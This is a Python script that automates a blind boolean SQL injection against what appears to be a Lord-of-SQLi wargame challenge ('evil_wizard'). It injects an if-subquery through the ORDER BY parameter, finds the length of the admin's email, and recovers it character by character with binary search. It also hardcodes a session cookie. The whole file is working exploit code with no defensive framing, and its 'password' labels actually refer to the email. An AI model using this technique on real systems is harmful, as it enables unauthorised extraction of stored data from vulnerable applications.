#!/usr/bin/env python3
# coding: utf-8

import requests
from math import floor

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=(select if(id='admin' and {0},0,1))".format(query)
    r = requests.get(url, headers=headers)
    if r.text.find('<td>50</td></tr><tr><td>rubiya</td>') > -1:
        return True
    return False


def get_email_length():
    i = 0
    while True:
        query = 'length(email)={0}'.format(i)
        if is_true(query):
            return i
        i += 1


def guess_char(location):
    bottom = 0
    top = 0xff
    while True:
        mid = floor((bottom + top) / 2)
        print('top :', top, ' | mid :', mid, ' | bottom :', bottom)
        query = "ord(mid(email,{0},1))>{1}".format(location, mid)
        if is_true(query):
            if top == bottom:
                return chr(mid)
            bottom = mid + 1
        else:
            if mid == top:
                return chr(mid)
            top = mid


def get_password():
    length = get_email_length()
    print('[*] pw length :', length)
    password = ''
    for i in range(1, length + 1):
        password += guess_char(i)
        print('[*] leaked password :', password)
    return password


def main():
    print('[*] password :', get_password().lower())


if __name__ == '__main__':
    main()

